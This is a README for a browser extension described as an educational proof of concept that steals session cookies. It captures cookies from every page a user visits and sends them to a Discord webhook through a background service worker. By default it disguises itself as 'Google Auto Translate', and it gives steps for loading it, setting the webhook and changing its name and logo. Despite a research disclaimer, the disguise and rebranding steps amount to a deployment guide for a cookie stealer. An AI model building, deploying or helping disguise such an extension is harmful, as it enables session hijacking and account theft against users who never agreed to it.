# Cookie Exfiltration PoC (Educational)

### ⚠️ Disclaimer
**This project is for educational and research purposes only.** The creator assumes no liability for any misuse or damage caused by this software. Use this tool only on systems you own or have explicit permission to test. Unauthorized access to data is illegal and unethical.

---

## 📌 Project Overview
This is a proof-of-concept (PoC) browser extension designed to demonstrate how malicious extensions can exfiltrate sensitive session data (cookies) via background service workers. It is intended for security researchers and developers to test the detection capabilities of SIEMs and browser security tools.

## 🚀 Installation Guide

### Step 1: Download the Repository
*   **Linux/macOS:** Run `git clone <your-repo-url>` in your terminal.
*   **Windows:** Download the repository as a **ZIP** file and unzip it to a known directory.

### Step 2: Access Browser Extensions
Open your browser (Chrome, Edge, or Brave) and click on the **Extensions icon** (puzzle piece) in the top right corner.

### Step 3: Open Extension Management
Click on **"Manage extensions"** at the bottom of the menu. A new tab (`chrome://extensions`) will open.

### Step 4: Enable Developer Mode
In the top right corner of the Extensions page, toggle the **Developer mode** switch to **ON**.

### Step 5: Load the Extension
1.  Click the **"Load unpacked"** button in the top left corner.
2.  Browse to the directory where you cloned or unzipped the project.
3.  Select the folder containing `manifest.json`.

### Step 6: Verify Installation
The extension (defaulted as "Google Auto Translate") should now appear in your list of active extensions.

---

## ⚙️ Configuration

To customize the behavior of the PoC, modify the following files:

### 1. Set the Discord Webhook
Open `background.js` and locate the `WEBHOOK_URL` constant. Replace the placeholder with your actual URL:
```javascript
const WEBHOOK_URL = "https://discord.com/api/webhooks/your-id-here"; 
```

### 2. Change Extension Identity
Open `manifest.json` to change the name displayed in the browser:
```json
"name": "Your Custom Extension Name",
```

### 3. Update the Logo
1.  Prepare a new image in `.png` format.
2.  Rename the image to **`logo.png`**.
3.  Place it inside the root directory, replacing the existing file.
4.  Go back to `chrome://extensions` and click the **Reload icon** (circular arrow) on the extension card to apply changes.

---

## 🛠 Features
*   **Real-time Monitoring:** Triggers every time a page finishes loading.
*   **Session Capture:** Accesses `chrome.cookies` for the specific domain the user is visiting.
*   **Silent Background Exfiltration:** Uses Manifest V3 Service Workers to send data without interrupting the user experience.
